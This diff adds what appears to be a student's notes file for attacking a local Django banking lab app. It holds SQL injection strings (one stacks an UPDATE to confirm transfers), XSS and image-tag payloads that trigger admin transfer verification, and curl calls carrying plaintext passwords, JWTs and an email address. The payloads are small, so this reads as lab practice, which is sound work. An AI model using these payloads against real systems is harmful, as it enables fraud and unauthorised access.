@@ -1,0 +1,24 @@
+1.----> " OR 1=1;--
+2.----> " ;UPDATE bankApp_transfer SET is_confirmed=TRUE WHERE title LIKE "xsx";--
+3.---->" OR 1=1;SHOW VARIABLES WHERE Variable_Name LIKE "%dir";
+
+Wklejone zaraz za title:
+<script>
+    if (window.location.href == \'http://localhost:8000/admin/transfer-verification/\'){window.addEventListener(\"load\", () => {fetch(\"/admin/transfer-verification/68/\");})}
+</script>
+
+<img src=\"http://localhost:8000/admin/transfer-verification/80/\">
+https://cutt.ly/IkqEYpY
+
+uwsgi --ini uwsgi.ini
+./gunicorn_start
+
+curl --header Content-Type:application/json -u erthax:Grimoire2 --data '{"recipient_name":"frank","recipient_account":"4055897548571584815","title":"masz pinionszka","amount":"55"}' http://localhost:8000/api/transfer_send/
+curl --header Content-Type:application/json -u erthax:Grimoire2 http://localhost:8000/api/transfers_history/
+
+curl --header Content-Type:application/json --data '{"username":"frank","password":"castle123"}' http://localhost:8000/api/token/
+curl -X POST --header Content-Type:application/json --cacert bigCA.crt --key usrkey.pem --cert usrcert.crt --data '{"username":"frank","first_name":"frank","last_name":"frank","email":"nsz.kochanek@gmail.com","password":"castle123"}' http://localhost:8000/api/user_registration/
+curl -X POST --header Content-Type:application/json --cacert bigCA.crt --key usrkey.pem --cert usrcert.crt -H "Content-Type: application/json" -d '{"username": "erthax", "password": "Grimoire2"}' http://localhost:8000/api/token/
+
+curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNjExODk4MjQ2LCJqdGkiOiJmMWU0Y2UwMWRmY2M0ZDU3YTBhMDEwNzA3NmQzNzU3ZSIsInVzZXJfaWQiOjV9.XyuSd8v5eJdJMixTIyDZvStPBjExjx5J0uWBS88OK4s" --data '{"recipient_name":"frank","recipient_account":"4055897548571584815","title":"masz pinionszka","amount":"55"}' http://localhost:8000/api/transfer_send/
+curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNjEyMzYzODE0LCJqdGkiOiJhYzMxOTE3MzM1MzY0M2MwODg2YzVhNjA5MTY3MjM5NSIsInVzZXJfaWQiOjV9.SCYf00LJvOs1W2wf8Ha4bAKjpfRLbPEquCoj25LCBw8" http://localhost:8000/api/transfers_history/
